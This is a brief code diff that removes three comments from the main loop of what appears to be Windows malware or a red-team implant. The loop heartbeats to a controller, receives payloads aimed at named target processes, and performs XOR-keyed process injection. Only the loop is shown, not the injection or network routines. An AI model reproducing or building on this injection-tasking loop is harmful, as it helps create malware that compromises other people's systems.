@@ -2391,7 +2391,6 @@ int main(void) {
                 DEBUG("[Main Loop - Payload Detected] Payload size: %zu bytes\n", current_task.payload_size);
                 DEBUG("[Main Loop - Payload Detected] Target process: %s\n", current_task.target_process);
 
-                // Execute injection task
                 int exec_result = execute_task(&current_task, xor_function_key, xor_process_key);
 
                 if (exec_result == 0) {
@@ -2400,7 +2399,6 @@ int main(void) {
                     DEBUG("[Main Loop - Injection Failed] Injection failed with code %d\n", exec_result);
                 }
 
-                // Clean up payload memory
                 if (current_task.payload) {
                     free(current_task.payload);
                     current_task.payload = NULL;
@@ -2416,7 +2414,6 @@ int main(void) {
             DEBUG("[Main Loop - Error] Heartbeat failed\n");
         }
 
-        // Sleep 5 seconds before next heartbeat
         Sleep(5000);
     }
     
